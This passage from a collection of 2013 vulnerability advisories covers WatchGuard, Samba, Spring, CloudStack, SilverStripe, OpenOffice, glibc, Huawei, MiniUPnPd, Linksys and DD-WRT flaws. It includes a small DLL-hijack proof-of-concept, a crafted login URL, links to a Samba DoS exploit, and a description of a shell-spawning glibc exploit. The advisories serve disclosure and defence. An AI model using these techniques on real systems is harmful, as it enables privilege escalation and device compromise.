42B0 5A53 6505 6638 44BB 3943 2BF7 D83F 210A 95AF
http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x2BF7D83F210A95AF"
8041,[CVE-2013-5701] Watchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local Privilege Escalation Vulnerability,,CVE-2013-5701,"Watchguard Server Center v11.7.4 wgpr.dll Insecure Library Loading Local
Privilege Escalation Vulnerability
RCE Security Advisory
http://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: Watchguard Server Center
Vendor URL: www.watchguard.com
Type: Uncontrolled Search Path Element [CWE-427]
Date found: 2013-07-29
Date published: 2013-08-09
CVSSv2 Score: 6,6 (AV:L/AC:M/Au:S/C:C/I:C/A:C)
CVE: CVE-2013-5701
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
--------------------
Watchguard Server Center v11.7.4
Watchguard Server Center v11.7.3
and other older versions may be affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
An insecure library loading vulnerability has been identified in different
components of the Watchguard Server Center v11.7.4.
The application installs two services ""Watchguard Log Collector""
(%installdir%wsm11wlcollectorinwlcollector.exe)
and ""Watchguard WebBlocker Server""
(%installdir%wsm11wbserverinwbserver.exe).
Both application services use a fixed path to look for specific files or
libraries. This path includes directories that may not be trusted or under
user control.
By placing a custom version of a library in the application path, the
program will load it before the legitimate version. This allows an attacker
to inject custom code that will be run with the privilege of the program or
user executing the program. The following libraries could be hijacked on
this way:
wgpr.dll
Since both services are running using the SYSTEM account, this may allow a
less privileged user to gain access to SYSTEM privileges. A local attacker
or compromised process is able to put a malicious application library into
the directory which will be executed after a service restart.
On a default installation (%programfiles%Watchguard) of the Watchguard
Server Center on Windows Vista and above the directory permissions disallow
an low-privileged attacker to mount the attack.
On a default installation (%programfiles%Watchguard) of the Watchguard
Server Center on Windows XP, the attacker needs to have at least Power User
rights to successfully mount the attack.
On a non-default installation of the Watchguard Server Center to a
directory, which is writeable by a low-privileged user, the attack can be
mounted successfully without any restrictions.
5. DEBUG INFORMATION
--------------------
The vulnerable code part of wlcollector.exe:
00401691 MOV EDI,DWORD PTR DS:[<&KERNEL32.LoadLib>; kernel32.LoadLibraryA
00401697 MOV ESI,EAX
00401699 TEST ESI,ESI
0040169B JE SHORT wlcollec.004016B3
0040169D PUSH wlcollec.00409320 ; /ProcNameOrOrdinal
004016A2 PUSH wlcollec.00409310 ; |/FileName = ""kernel32.dll""
004016A7 CALL EDI ; |LoadLibraryA
004016A9 PUSH EAX ; |hModule
004016AA CALL EBX ; GetProcAddress
004016AC TEST EAX,EAX
004016AE JE SHORT wlcollec.004016B3
004016B0 PUSH ESI
004016B1 CALL EAX
004016B3 PUSH wlcollec.00409304 ; ASCII ""wgpr.dll""
004016B8 CALL EDI ; kernel32.LoadLibraryA
The vulnerable code part of wbserver.exe
00401041 MOV EDI,DWORD PTR DS:[<&KERNEL32.LoadLib>; kernel32.LoadLibraryA
00401047 MOV ESI,EAX
00401049 TEST ESI,ESI
0040104B JE SHORT wbserver.00401063
0040104D PUSH wbserver.00408284 ; /ProcNameOrOrdinal
00401052 PUSH wbserver.00408274 ; |/FileName = ""kernel32.dll""
00401057 CALL EDI ; |LoadLibraryA
00401059 PUSH EAX ; |hModule
0040105A CALL EBX ; GetProcAddress
0040105C TEST EAX,EAX
0040105E JE SHORT wbserver.00401063
00401060 PUSH ESI
00401061 CALL EAX
00401063 PUSH wbserver.00408268 ; ASCII ""wgpr.dll""
00401068 CALL EDI
6. PROOF-OF-CONCEPT (CODE / EXPLOIT)
------------------------------------
Use the following code to exploit the vulnerability:
#include <windows.h>
#define DLL_EXPORT __declspec(dllexport)
#ifdef __cplusplus
extern ""C""
{
#endif
void DLL_EXPORT wgpr_library_get()
{
WinExec(""calc"",0);
}
#ifdef __cplusplus
}
#endif
6. SOLUTION
-----------
Administrators who installed the Watchguard Server Center on WinXP or
outside the default installation folder, should harden the directories
permissions (administrative write permissions only) on the mentioned
folders to lower the attack risk.
7. REPORT TIMELINE
------------------
2013-07-29: Discovery of the vulnerability
2013-07-30: RCE Security sends first notification to Customer Care via mail
with disclosure date set to 13. August 2013
2013-08-05: RCE Security sends second notification using Twitter
2013-08-05: Response from vendor
2013-08-05: RCE Security sends vulnerability details to vendor
2013-08-05: Vendor ACKs the issue and asks for an extension of 30 days
2013-08-06: New disclosure date set to 13. September 2013
2013-08-06: Vendor assigns bug id #75251
2013-08-19: No further status updates received according to disclosure
policy, asking for status update
2013-08-19: Vendor estimates the risk of the issue as ""extremely limited"",
and therefor ACKs the public disclosure
2013-08-28: Vendor plans to release the fix with the next major release in
around Q4
2013-09-05: MITRE assigns CVE-2013-5701 for this issue
2013-09-08: Full Disclosure
8. REFERENCES
-------------
https://www.rcesecurity.com/2013/09/cve-2013-5701-watchguard-server-center-v11-7-4-wgpr-dll-local-privileges-escalation-vulnerability/"
8076,CVE-2013-5216 CapaSystems Performance Guard Path Traversal Vulnerability,,CVE-2013-5216,"Application Performance Guard
Vendor CapaSystems
Link http://www.capasystems.com/it-performance-monitorin
Discovered by Kerem Kocaer <kerem.kocaer(at)gmail(dot)com>
Problem
-------
Path traversal vulnerability in the ""download logs"" section allows remote attackers to read
arbitrary files by intercepting and modifying the file path in an HTTP request to ""uploadreader.jsp"".
The vulnerability is confirmed to exist in version 6.1.27. Other versions may also be vulnerable.
Exploit
-------
This issue can be exploited with a web browser and a proxy tool to intercept and modify parameters
sent to: http://[address]/logreader/uploadreader.jsp
Fix
---
The vendor has reported fixing the problem in version 6.2.102.
Bug Fix PG-8050 (http://capawiki.capasystems.com/display/pgdoc/PG+6.2.102)
Timeline
--------
2013-05-16 Provided details to CapaSystems
2013-06-07 Performance Guard version 6.2.102 released (with Bug fix PG-8050)
Reference
---------
CVE Number: CVE-2013-5216"
8110,CVE-2013-4124 samba dos exploit,,CVE-2013-4124,"Hi forks!
I added automated offset and second
argv to server name for nbt session
to my samba dos exploit I released
before
and I attached the exploit on the
article for it
samba dos exploit should be works!
- samba dos exploit:
http://www.x90c.org/exploits/samba_nttrans_exploit.c
- the article within analyze:
http://www.x90c.org/articles/samba_nttrans_reply_integer_overflow.txt
x90c"
8113,CVE-2013-4152 XML External Entity (XXE) injection in Spring Framework,,CVE-2013-4152,"Severity: Important
Vendor: Spring by Pivotal
Versions Affected:
- 3.0.0 to 3.2.3 (Spring OXM & Spring MVC)
- 4.0.0.M1 (Spring OXM)
- 4.0.0.M1-4.0.0.M2 (Spring MVC)
- Earlier unsupported versions may also be affected
Description:
The Spring OXM wrapper did not expose any property for disabling entity resolution when using the JAXB unmarshaller. There are four possible source implementations passed to the unmarshaller:
- DOMSource
- StAXSource
- SAXSource
- StreamSource
For a DOMSource, the XML has already been parsed by user code and that code is responsible for protecting against XXE.
For a StAXSource, the XMLStreamReader has already been created by user code and that code is responsible for protecting against XXE.
For SAXSource and StreamSource instances, Spring processed external entities by default thereby creating this vulnerability.
The issue was resolved by disabling external entity processing by default and adding an option to enable it for those users that need to use this feature when processing XML from a trusted source.
It was also identified that Spring MVC processed user provided XML with JAXB in combination with a StAX XMLInputFactory without disabling external entity resolution. External entity resolution has been disabled in this case.
Mitigation:
Users of affected versions should apply the following mitigation:
- Users of 3.x should upgrade to 3.2.4 or later
- Users of 4.x should upgrade to 4.0.0.RC1 or later once released
Note the Spring OXM issue is fixed in 4.0.0.M2
Credit:
These issues were identified by Alvaro Munoz of the HP Enterprise Security Team.
References:
http://www.gopivotal.com/security/cve-2013-4152
https://github.com/SpringSource/spring-framework/pull/317 (Spring OXM)
https://jira.springsource.org/browse/SPR-10806 (Spring MVC)
History:
2013-Aug-22: Initial vulnerability report published."
8131,CVE-2013-4124 samba nttrans dos private exploit,,CVE-2013-4124,"Hi Forks!
It's my samba private exploit and article
of it. the security bug occurs while nttrans
reply in samba daemon source code tree.
the remote dos exploit that i copied from
another nttrans exploit in 2003. and can't
test it yet, check it out!
CVE-2013-4124 samba dos private exploit:
- http://www.x90c.org/exploits/samba_nttr
ans_exploit.c
.. and I left an article about the bug with an analyze
samba nttrans reply integer overflow:
- http://www.x90c.org/articles/samba_nttran
s_reply_integer_overflow.txt
x90c"
8171,Updated [CVE-2013-2136] Apache CloudStack Cross-site scripting (XSS) vulnerabiliity,,CVE-2013-2136,"Issued: August 6, 2013
Updated: August 7, 2013
Product: Apache CloudStack
Vendor: The Apache Software Foundation
Vulnerability Type(s): Cross-site scripting (XSS)
Vulnerable version(s): Apache CloudStack versions 4.0.0-incubating,
4.0.1-incubating, 4.0.2 and 4.1.0
CVE References: CVE-2013-2136
Risk Level: Low
CVSSv2 Base Scores: 4 (AV:N/AC:L/Au:S/C:N/I:P/A:N)
Description:
The Apache CloudStack Security Team was notified of an issue found in
the Apache CloudStack user interface that allows an authenticated user
to execute cross-site scripting attack against other users within the
system.
Mitigation:
Updating to Apache CloudStack versions 4.1.1 or higher will mitigate
this vulnerability.
Please see the 4.1.1 release notes for further information about how to
upgrade:
http://cloudstack.apache.org/docs/en-US/Apache_CloudStack/4.1.1/html/Release_Notes/index.html
References:
https://issues.apache.org/jira/browse/CLOUDSTACK-2936
Credit:
This issue was identified by Oleg Boytsev from strongserver.org."
8178,[CVE-2013-2136] Apache CloudStack Cross-site scripting (XSS) vulnerabiliity,,CVE-2013-2136,"Product: Apache CloudStack
Vendor: The Apache Software Foundation
Vulnerability Type(s): Cross-site scripting (XSS)
Vulnerable version(s): Apache CloudStack versions 4.0.0-incubating,
4.0.1-incubating, 4.0.2 and 4.1.0
CVE References: CVE-2013-2136
Risk Level: Low
CVSSv2 Base Scores: 4 (AV:N/AC:L/Au:S/C:N/I:P/A:N)
Description:
The Apache CloudStack Security Team was notified of an issue found in
the Apache CloudStack user interface that allows an authenticated user
to execute cross-site scripting attack against other users within the
system.
Mitigation:
Updating to Apache CloudStack versions 4.1.1 or higher will mitigate
this vulnerability.
Please see the 4.1.1 release notes for further information about how to
upgrade:
http://cloudstack.apache.org/docs/en-US/Apache_CloudStack/4.1.1/html/Release_Notes/index.html
References:
https://issues.apache.org/jira/browse/CLOUDSTACK-2936"
8208,SilverStripe(R) Information Exposure Through Query Strings in GET Request (CWE-598),CWE-598,,"SilverStripe(R) Information Exposure Through Query Strings in GET Request (CWE-598)
- CVE: CVE-2013-2653
- CWE: CWE-598
- Deloitte Argentina Advisory Code: DTTAR-20130002
- Vendor Status: CONFIRMED
- Vendor Disclosure Date: May, 8th, 2013.
- Public Disclosure Date: August, 1st, 2013.
- Vendors Affected: SilverStripe - http://www.silverstripe.org/
- Systems Affected: SilverStripe CMS v3.0.3
- Description: It was observed that the SilverStripe CMS application is susceptible to information exposure through query strings in forced GET requests. The objective for a malicious user would be to send a specially crafted URL to a valid user, in an attempt to trick them into clicking this malicious link and execute the action in the victim’s context. A malicious user may craft a website requesting email and password, where inside an iframe an automatic login to the real website could be executed and go by unnoticed.
- PoC: http://<IP:Port>/Security/LoginForm?AuthenticationMethod=MemberAuthenticator&Email=<email>&Password=<password>&BackURL=%2Fadmin%2Fpages&action_dologin=Log+in
NOTE: A single click to the URL above, allows access to the admin section of SilverStripe, redirecting the user to http://<IP:Port>/admin/pages
- Vulnerability Status: in process of being released.
- Patch Available: https://github.com/chillu/silverstripe-framework/commit/3e88c98ca513880e2b43ed7f27ade17fef5d9170
- Fix: Will be available on 3.1 release.
- Related Links: Deloitte Argentina - www.deloitte.com/ar
- Credits: This vulnerability was found by Fara Rustein from Deloitte Argentina (https://twitter.com/FaraRustein).
- Feedback: If you have any questions, comments, concerns, updates or suggestions please feel free to send them to: frustein deloitte com
Fara Rustein
Senior Consultant, Cyber Security - ERS
Deloitte & Co. S.A.
Tte. Gral.J.D.Perón 646 - C1038AAN Buenos Aires Argentina
Main: +54 11 4320 2700 ext. 8350 | Fax: +54 11 4320 4071
frustein deloitte com | www.deloitte.com
 Please consider the environment before printing.
 
Deloitte se refiere a una o más de las firmas miembros de Deloitte Touche Tohmatsu Limited, una compañía privada del Reino Unido limitada por garantía, y su red de firmas miembros, cada una como una entidad única e independiente y legalmente separada. Una descripción detallada de la estructura legal de Deloitte Touche Tohmatsu Limited y sus firmas miembros puede verse en el sitio web http://www.deloitte.com/about.                           La información de este mail es confidencial y concierne únicamente a la persona a quien está dirigida. Si este mensaje no está dirigido a usted, por favor tenga presente que no tiene autorización para leer el resto de este e-mail, copiarlo o derivarlo a cualquier otra persona que no sea aquella a quien está dirigido. Si recibe este mail por error, por favor, avise al remitente, luego de lo cual rogamos a usted destruya el mensaje original. No se puede responsabilizar de ningún modo a Deloitte & Co. S.A. ni a sus subsidiarias por cualquier consecuencia o daño que pueda resultar del apropiado y completo envío y recepción del contenido de este e-mail.
 
Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see http://www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. 
The information in this e-mail is confidential and intended solely for the person to whom it is addressed. If this message is not addressed to you, please be aware that you have no authorization to read the rest of this e-mail, to copy it or to furnish it to any person other than the addressee. Should you have received this e-mail by mistake, please bring this to the attention of the sender, after which you are kindly requested to destroy the original message. Deloitte & Co. S.A. and subsidiaries cannot be held responsible or liable in any way whatsoever for and/or in connection with any consequences and/or damage resulting from the proper and complete dispatch and receipt of the content of this e-mail."
8245,CVE-2013-4156: OpenOffice DOCM Memory Corruption Vulnerability,,CVE-2013-4156,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-4156
OpenOffice DOCM Memory Corruption Vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache OpenOffice 3.4.0 and 3.4.1, on all platforms.
Predecessor versions of OpenOffice.org may be also affected.
Description:
The vulnerability is caused by mishandling of unknown XML elements
when parsing a OOXML document file. Specially crafted documents can be
used for memory-corruption attacks. Further exploits are possible but
have not been verified.
Mitigation
Apache OpenOffice 3.4.0 and 3.4.1 users are advised to upgrade to
Apache OpenOffice 4.0. Users who are unable to upgrade immediately
should be cautious when opening untrusted documents.
Credits
The Apache OpenOffice Security Team credits Jeremy Brown of
Microsoft Vulnerability Research as the discoverer of this flaw.
Herbert Dï¿½rr
Member of the Apache OpenOffice Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iQIcBAEBAgAGBQJR8g+LAAoJEDfnuKc+PLjJPmkP/j3BnqefvmPbTicx8cZR+Q+I
Y0EqD/2Kvu0qQw6v7S27CnHVpErh9tvEfDViZpXz8hyds3LgVCxOQjFp+XSqvDTW
Ut4Ug1tx7N8+RcpTW7qM0/wRRWdjZIdh8sTrtkB93bqbJguLiYk3KWqK2cxW11q6
1fQitnAegZNRVZnSU0rGGVfnc26ulvS0gljpNqhvDit9jOXw5MC+aN05XmCrx/qK
NrGUUPJeiyi/5g0xxx4ig/N0/EvO1iZmQAGEE7O24tsoP1hqvuySI0U1kLIhI//x
ZdeK4JukZm2OQq0ACXJYhrU0mhfCfdaRW0U4NWiTpBbwfsn0uAMPBhXSO9O+YPQj
sWUzLixEg+4EtTQss9oGW+CBaZz+HfErIIUj2rxT01SDlbcfa4ME5giFGC0UO9Ai
1N+GHd8IyWegwUBWV3FSZ9fCbDjaQUCv8cYN3zMo/xl/AsA9LKEsJ0l51B1WnHnY
nwoXunUdgUL06blCZ4rwTzoFqSSPrCBDb/ff/PREGvJU4LOFTp6IrxgDH3ODSAE4
jOMuFCjhdDnx7WWDwxi9JnBYE4CwXmhlYNdSdie4pUP6BAq4e2I6kYRkKA3rWf2h
CEj1FreYvaYV4OFVcF8wVpP1w5vFgOlOKOy19Y/gP5B29qe2O5qIrFmnx8gPV2iV
7kLeWn4ZPoGXoPkC3TYa
=4hNB
-----END PGP SIGNATURE-----"
8246,CVE-2013-2189: OpenOffice DOC Memory Corruption Vulnerability,,CVE-2013-2189,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-2189
OpenOffice DOC Memory Corruption Vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache OpenOffice 3.4.0 to 3.4.1 on all platforms.
Predecessor versions of OpenOffice.org may be also affected.
Description:
The vulnerability is caused by operating on invalid PLCF (Plex of
Character Positions in File) data when parsing a malformed DOC document
file. Specially crafted documents can be used for denial-of-service
attacks. Further exploits are possible but have not been verified.
Mitigation:
Apache OpenOffice 3.4 users are advised to upgrade to Apache
OpenOffice 4.0. Users who are unable to upgrade immediately should be
cautious when opening untrusted documents.
Credits:
The Apache OpenOffice Security Team credits Jeremy Brown of
Microsoft Vulnerability Research as the discoverer of this flaw.
Herbert Dï¿½rr
Member of the Apache OpenOffice Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iQIcBAEBAgAGBQJR8g9+AAoJEDfnuKc+PLjJbqIP/2PaWKJvwYVXOmr33gVD4Kpx
Q2zzCfK/je3rJmK6PAfJpGB2ooKim00/Q/+G+gYvvi+35NQLk2dgfynkdhRiQP59
9DaPeNC7NDAjDgIk+8hC/reKmwfqdyyMj0FU/NwIIjEsMPMzKl3Vc1svEN9vz5GN
lc3fLORH5GPUVZkwJfV+C+CyBCLk3Yurxd4GNTBpqFKmbR7ENQmKPAmH5gEMIZO7
iCSzGK4terEUjUtAmvHy4yFlZtHz33XgvMZZrbE92y7ppoury8ZN4mb42vAowTDQ
+JSGtBKCGPDQRaoDOJdwhafgFcnRu10sJbUtYMmSy9qcZNq6JFHe2aR7+j9h0pN+
c85HgwM/NyCjmw8y5EhD+3Cjwc6AlF9olekPSUui7x+6svDj3uVSM4/tpg/pPXLn
0SLB8r6BrxfP5naqMFwISdbSZaQiGuV3JvFhz7VB6k8tMuzIgI8Huw9IT28LP34F
Yxn2VCvzHpZOpWHB9lYORxn1GI+WlrSrKvbaZYUOnBm8fniLHuRSSrra+IWOZqjW
UbCko1gtr0A0b9HEeuVVeJAKyXEL52hUUJ2RmZfGJdWGLC/k/8i+s4Ppvqzmf3r2
ujAfn89Vhk12cAb5NXidV4Nh8Ko82Ow32GBBHlavPHX5T5LVnGNa6CWGoctuQGru
T6rrd/hV6DXtMmgWPTPH
=t46D
-----END PGP SIGNATURE-----"
8274,[CVE-2013-2250] Apache OFBiz Nested expression evaluation allows remote users to execute arbitrary UEL functions in OFBiz,,CVE-2013-2250,"CVE-2013-2250 - Apache OFBiz Nested expression evaluation allows remote users to execute arbitrary UEL functions in OFBiz
Vendor:
The Apache Software Foundation
Versions Affected:
Apache OFBiz 10.04.01 to 10.04.05
Apache OFBiz 11.04.01 to 11.04.02
Apache OFBiz 12.04.01
Description:
Parameter values are not correctly validated and if JUEL metacharacters are included they are interpreted.
Mitigation:
10.04.x users should upgrade to 10.04.06
11.04.x users should upgrade to 11.04.03
12.04.01 users should upgrade to 12.04.02
Credit:
This issue was discovered by Grégory Draperi (gregory.draperi gmail com).
References:
http://ofbiz.apache.org/download.html#vulnerabilities"
8275,"[CVE-2013-2137] Apache OFBiz XSS vulnerability in the ""View Log"" screen of the Webtools application",,CVE-2013-2137,"CVE-2013-2137 - Apache OFBiz XSS vulnerability in the ""View Log"" screen of the Webtools application
Vendor:
The Apache Software Foundation
Versions Affected:
Apache OFBiz 10.04.01 to 10.04.05
Apache OFBiz 11.04.01 to 11.04.02
Apache OFBiz 12.04.01
Description:
XSS vulnerability in the ""View Log"" screen of the Webtools application because the content of the html log was not properly encoded.
Mitigation:
10.04.x users should upgrade to 10.04.06
11.04.x users should upgrade to 11.04.03
12.04.01 users should upgrade to 12.04.02
Credit:
This issue was discovered by Grégory Draperi (gregory.draperi gmail com).
References:
http://ofbiz.apache.org/download.html#vulnerabilities"
8310,CVE-2013-4788 - Eglibc PTR MANGLE bug,,CVE-2013-4788,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Hi guys,
The following is a bug that we found while we were working around
stack smashing protection techniques.
Title: CVE-2013-4788 - Eglibc PTR MANGLE bug
0.- Description
This bug was discovered in March 2013 while we were developing the RAF SSP
technique. The glibc bug makes it easy to take advantage of common
errors such
as buffer overflows allows in these cases redirect the execution flow and
potentially execute arbitrary code.
1.- Impact
All statically linked applications compiled with glibc and eglibc are
affected,
independent of the operating system distribution. Note that this problem
is not
solved by only patching the eglibc, but it is also necessary to
recompile all
static executables. As far I know there are a lot of routers, embedded
systems
etc., which use static linked applications. Since the bug is from the
beginning
of the PTR_MANGLE implementations (years 2005-2006) there are a ton of
vulnerable devices.
2.- Vulnerable packages
The bug has been propagated to all the static code compiled with all
versions,
on all architectures, of glibc from 2.4 (06-Mar-2006) to 2.17 (Current
version).
3.- Vulnerability
The vulnerability is caused due to the non initialization to a random
value (it
is always zero) of the ""pointer guard"" by the glibc only when generating
static
compiled executables. Dynamic executables are not affected. Pointer guard is
used to mangle the content of sensible pointers (longjmp, signal handlers,
etc.), if the pointer guard value is zero (non-initialized) then it is not
effective. An example: Library functions like ""setjmp()"" or
""longjmp()"" use
PTR_MANGLE and PTR_DEMANGLE. These macros are used to protect structures
like
jmp_buf. Basically consist on XOR-ing the pointer value with a random
32/64-bit
value. Since the pointer guard (random value) is 0x0 the attacker can easily
calculate off-line the value of a target address. By overwriting the ""env""
structure with the pre-computed address the vulnerability is triggered when
longjmp() is called and the execution flow is redirected to attacker
address.
4.- Exploit
The bug was tested with Debian 7.1 and Ubunu 12.04 LTS and 13.04). I already
created a proof of concept to exploit this vulnerability for both 32 and 64
bits x86 architectures. The proof of concept poc-bug-mangle.c redirect the
execution flow to a function which prompt a shell. This exploit can be
compiled
for both i386 and x86_64 architectures. More architectures can be added
easily
by adding the correspondent defines.
Compilation for i386:
gcc poc-bug-mangle.c -o poc-bug-mangle -static
Compilation for x86_64:
gcc poc-bug-mangle.c -o poc-bug-mangle_32 -static -m32
gcc poc-bug-mangle.c -o poc-bug-mangle_64 -static -m64
Execution output:
box iti upv es:~$ ./poc-bug-mangle
[+] Exploiting ...
[+] hacked !!
$
5.- FIX
Note that the bug is not solved by only patching the eglibc, but it is also
necessary to recompile all static executables. I have created a non official
patch ptr_mangle-eglibc-2.17.patch for the gblic-2.17.
Patching glibc-2.17:
wget http://hmarco.org/bugs/patches/ptr_mangle-eglibc-2.17.patch
cd glibc-2.17
patch -p1 < ../ptr_mangle-eglibc-2.17.patch
6.- Discussion
Although this bug is not exploitable by itself, the truth is that the PTR
Mangle encryption is useless. The goal of the protection technique is not
achieved. This can be seen as the canary stack is set to 0x0, although
is not
exploitable by itself is clearly an issue. What about whether the canary has
been set to zero from 2006 to today ? This is what happened with the
pointers
protected with this mechanism. According to Ulrich_Drepper to use
""encryption
pointers (instead of canaries) to protect structures like jmp_buf is at
least
as secure and in addition faster"". Following the above and since the
protection
mechanism is useless from the first implementation, the number of
potentially
affected systems could be huge.
Patch and exploit source code:
http://hmarco.org/bugs/CVE-2013-4788.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
Comment: Using GnuPG with undefined - http://www.enigmail.net/
iQIcBAEBAgAGBQJR5D3CAAoJEI9kAsYMQl6irpMQAJ7vGyBETTHeyURqLmKUgofg
YRnK1ia/CszGyNSZVTCF6NIv6JMtaXsF3xvITk0dj68WMtc5DdTSMkw2XQSwzBJv
Vlh8QE6KayM+D0esBy6m7+7dLcPyshW4zTKzU6vQwAkxB+PdRKPuEwnVO3hoqtB/
cwiAhk7J2m5sTkKWVz48JJG/f6EjJRZJLaB6J2pzHPijvBCGmTeXLU4+9RnO4i0q
CoPcJai5uwDk9yRtj2iwbnHj6PIdSeJj3Sw3UJwZb9vF5gX2FQdSQJTc3yvzc3+7
UMHzuEcScFXWPJpKZGuiHU43sBu9pKvye3MUroEOcG6e4woncABRYRSQzDriN/AJ
aUpmvaFtllCA9es286GTBVN7/GGlpLb0PyfdfQW9cVgPqpFZ7Z5GQFMa+pZ/nPRZ
gM4aa2YFveQckBJS14yVMz/lyixcVxpEQH0lJbLYO6L9G+0kdaK8knUMR5q9SFYZ
GkUzauDkzsGUmDrCvam9mYqc55HOmyQETIfu34SorTOnhD2Seg+BWujbU3BJ2NI1
qIp8SrmX+7V75Jsy9p5/LzkjDXyAoSlwi/RchhtCo5Ih99ZJgjlDrtuR9C+GVBL9
36IemhVfUdM0SFIUJVcCfSMPlrZO/eCCWRnJmTCUBhox9dZ01dUHMNC0h2q/gdxt
Bp4l0er3CX70KglD5YIx
=gFhS
-----END PGP SIGNATURE-----"
8313,[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection,,CVE-2013-2612,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
[CVE-2013-2612] Huawei E587 3G Mobile Hotspot Command Injection
________________________________________________________________________
Summary:
Huawei E587 3G Mobile Hotspot, version 11.203.27, is prone to a command
injection vulnerability in the Web UI.
Successful exploitation allows unauthenticated attackers to execute
arbitrary commands with root privileges.
________________________________________________________________________
Details:
The HTTP endpoint ""/api/device/time"" in Web UI is vulnerable to shell
command injection. This allows code execution with root privileges.
________________________________________________________________________
CVSS Version 2 Metrics:
Access Vector: Network exploitable
Access Complexity: Low
Authentication: Not required to exploit
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
________________________________________________________________________
Disclosure Timeline:
2013-03-18 Vendor notified
2013-03-18 CVE-2013-2612 assigned
2013-07-15 Public advisory
________________________________________________________________________
References:
http://www.huawei.com/en/security/psirt/
________________________________________________________________________
Frédéric Basse
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEcBAEBAgAGBQJR48qZAAoJENQ4kG3hg80AJMEH/Rdyx2zmDPzr2Ar5Nc+Fw1ih
aiby28PhIKfXhAst2SrkIp6ogtDEj+PBrgbEy2YJlyKi01z1Uf2UGukxijlQTg7H
0zYivz55vleBrr9OD/A2pxo7sZZy7eswH5jia5abRUVXYYqEVWYp5KWvzbMPO3CY
EgLYxE4uv00ojqHCl9QsD7oa+mR52Jur3QZ/IdCbJJZgmEKmwNJvJ8rb6RvTMcae
+8dWhC8bhfL3UkTW5snYZ4K/euA84LmGvcfd1PXrMAX01xXDdnPJ/JxrzSPLfb1x
6WyZO6cZpgxQqvogemXKOy2MmnNkWlkK0P9OmmDpBQBI66WnyBUxXNFxEr/HFKo=
=6yIl
-----END PGP SIGNATURE-----"
8318,MiniUPnPd Information Disclosure (CVE-2013-2600),,CVE-2013-2600,"Hi list,
I am writing to inform you of an information disclosure vulnerability I noticed in MiniUPnPd a few months back. Specifically, MiniUPnPd versions 1.8 and earlier are prone to an information disclosure vulnerability due to improper use of snprintf() while preparing SSDP responses. An attacker can exploit this vulnerability by sending a crafted request with a long ST header. If the header is long enough, the SSDP response buffer will be truncated by snprintf() and the subsequent sendto() call will read off the end of the buffer thereby disclosing the contents of adjacent memory. This response can reveal details of internal network topology as well as other activity on the target network.
This issue was addressed on April 26, 2013 as noted in the changelog: http://miniupnp.free.fr/files/changelog.php?file=miniupnpd-1.8.20130607.tar.gz
2013/04/26:
Correctly handle truncated snprintf() in SSDP code
The problem is illustrated in the following code snippet:
Minissdp.c:
203 static void SendSSDPAnnounce2(int s, struct sockaddr_in sockname,
204 const char * st, int st_len,
205 const char * host, unsigned short port)
206 {
207 int l, n;
208 char buf[512];
209 /* TODO :
210 * follow guideline from document ""UPnP Device Architecture 1.0""
211 * put in uppercase.
212 * DATE: is recommended
213 * SERVER: OS/ver UPnP/1.0 miniupnpd/1.0
214 * */
215 l = snprintf(buf, sizeof(buf), ""HTTP/1.1 200 OK ""
216 ""Cache-Control: max-age=120 ""
217 ""ST: %.*s ""
218 ""USN: %s::%.*s ""
219 ""EXT: ""
220 ""Server: "" MINIUPNPD_SERVER_STRING "" ""
221 ""Location: http://%s:%u"" ROOTDESC_PATH "" ""
222 "" "",
223 st_len, st,
224 uuidvalue, st_len, st,
225 host, (unsigned int)port);
226 n = sendto(s, buf, l, 0,
227 (struct sockaddr *)&sockname, sizeof(struct sockaddr_in) );
228 #if 0 //JM: Don't fill up syslog, even in error condition
229 if(n<0)
230 {
231 syslog(LOG_ERR, ""sendto: %m"");
232 }
233 #endif
234 }
Notice that the sendto on line 226 is using the snprintf return value, l, from line 215 without considering whether l > sizeof(buf) as is the case when the buffer is truncated. It is important to remember that snprintf() does not return the number of bytes written into the buffer but rather the number of bytes requested to be written into the buffer.
Kind Regards,
Craig Young
@CraigTweets"
8324,CVE-2013-3568 - Linksys CSRF + Root Command Injection,,CVE-2013-3568,"Hi list,
I would like to inform you that the latest available Linksys WRT110 firmware is prone to root shell command injection via cross-site request forgery. This vulnerability is the result of the web interface's failure to sanitize ping targets as well as a lack of csrf tokens. Linksys/Belkin has responded to my report to say that the vulnerability is mitigated by a 10 minute idle-timeout feature which is available for the admin portal on this device. It is likely that other devices with similar firmware are prone to this as well.
The command execution will not return output but it is possible to direct output into files which are available upon subsequent HTTP requests.
This issue was assigned as CVE-2013-3568.
Kind Regards,
Craig Young (@CraigTweets)"
8325,CVE-2012-6297 - Command Injection via CSRF on DD-WRT v24-sp2,,CVE-2012-6297,"DD-WRT v24-sp2 is prone to command injection from specially crafted configuration values containing shell meta-characters. A remote attacker can potentially use CSRF from an authenticated client to execute commands on the router as the root user. Successful exploitation can result in system wide compromise or a denial of service condition depending on the commands being injected.
This bug was reported via the DD-WRT bug tracker on November 20, 2012 but there does not appear to be ongoing development in the project."
8337,(CVE-2013-1059) Linux Kernel libceph Null Pointer Dereference Vulnerability,,CVE-2013-1059,"Original URL: http://hkpco.kr/advisory/CVE-2013-1059.txt
